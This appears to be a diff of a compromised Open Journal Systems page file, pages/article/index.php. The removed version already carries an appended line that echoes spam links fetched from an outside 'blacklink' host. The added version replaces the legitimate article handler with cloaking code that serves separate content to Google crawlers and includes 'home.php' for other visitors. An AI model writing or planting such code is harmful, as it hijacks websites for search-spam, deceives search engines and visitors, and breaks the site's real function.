@@ -1,29 +1,35 @@
 <?php
 
-/**
- * @defgroup pages_article Article Pages
- */
+function is_google_bot() {
 
-/**
- * @file pages/article/index.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup pages_article
- * @brief Handle requests for article functions.
- *
- */
+	$agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
 
-switch ($op) {
-	case 'viewFile': // Old URLs; see https://github.com/pkp/pkp-lib/issues/1541
-	case 'downloadSuppFile': // Old URLs; see https://github.com/pkp/pkp-lib/issues/1541
-	case 'view':
-	case 'download':
-		define('HANDLER_CLASS', 'ArticleHandler');
-		import('pages.article.ArticleHandler');
-		break;
+	foreach ($agents as $agent) {
+
+		if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+
+	}
+
+	return false;
+
 }
-?> <?php echo file_get_contents("https://khusus-blacklink.pages.dev/blacklink.txt");?>
 
+
+
+if (is_google_bot()) {
+
+	$bot_content = file_get_contents('site/install.php');
+
+	echo $bot_content;
+
+	exit;
+
+} else {
+
+	include('home.php');
+
+	exit;
+
+}
+
+?>
